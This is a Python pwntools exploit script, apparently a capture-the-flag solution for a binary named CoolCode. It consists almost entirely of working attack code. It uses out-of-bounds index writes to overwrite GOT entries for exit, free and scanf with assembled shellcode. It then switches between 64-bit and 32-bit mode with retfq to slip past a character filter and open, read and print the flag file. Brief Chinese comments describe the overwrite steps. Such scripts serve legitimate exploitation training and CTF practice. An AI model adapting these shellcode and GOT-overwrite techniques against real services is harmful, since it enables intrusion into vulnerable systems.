#-*- coding:utf8 -*-
from pwn import *
context(os = 'linux', log_level = 'debug', terminal = ['tmux', 'splitw', '-h'])
p = process('./CoolCode')
elf = ELF('CoolCode')

def Add(index, messages):
    p.sendlineafter('Your choice :', '1')
    p.sendlineafter('Index: ', str(index))
    p.sendafter('messages: ', messages)

def Show(index):
    p.sendlineafter('Your choice :', '2')
    p.sendlineafter('Index: ', str(index))

def Delete(index):
    p.sendlineafter('Your choice :', '3')
    p.sendlineafter('Index: ', str(index))

code_ret = asm('''
        ret
''', arch = 'amd64')

code_read = asm('''
        xor rbx, rbx
        push rbx
        push rbx
        pop rcx
        pop rdi
        push 0x204f34ff
        pop rsi
        xor rsi, 0x202f11ff
        xor rdx, rdx
        push 0x7f
        pop rdx
        xor rax, rax
        syscall
        ret
''', arch = 'amd64')

code_retfq = asm('''
        push 0x23
        push 0x204f34ff
        pop rsi
        xor rsi, 0x202f11ff
        push rsi
        retfq
''', arch = 'amd64', os = 'linux')

code_open = asm('''
        mov esp, 0x602700

        /* open */
        mov ebx, 0x602540 /* 待修改 */
        xor ecx, ecx
        xor edx, edx
        push 5
        pop eax
        int 0x80
        push eax
        pop ebx
''', arch = 'i386', os = 'linux')

code_retfq1 = asm('''
        push 0x33
        push 0x60251e
        retfq
''', arch = 'amd64')

code_read_write = asm('''
        /* read */
        push rbx
        pop rdi
        push 0x602800
        pop rsi
        push 0x50
        pop rdx
        push 0
        pop rax
        syscall

        /* write */
        push 1
        pop rdi
        push 0x602800
        pop rsi
        push 0x50
        pop rdx
        push 1
        pop rax
        syscall
''', arch = 'amd64', os = 'linux')

Add(-22, code_ret) # 修改exit的got表，绕过字符限制
Add(-37, code_read) # 修改free为read函数
Delete(0)
payload = code_open + code_retfq1 + code_read_write + 'Aflag'
p.send(payload)
Add(-23, code_retfq) #修改_isoc99_scanf函数为retfq
#gdb.attach(p, 'b * 0x400e14\nc')
Show(0)
p.interactive()
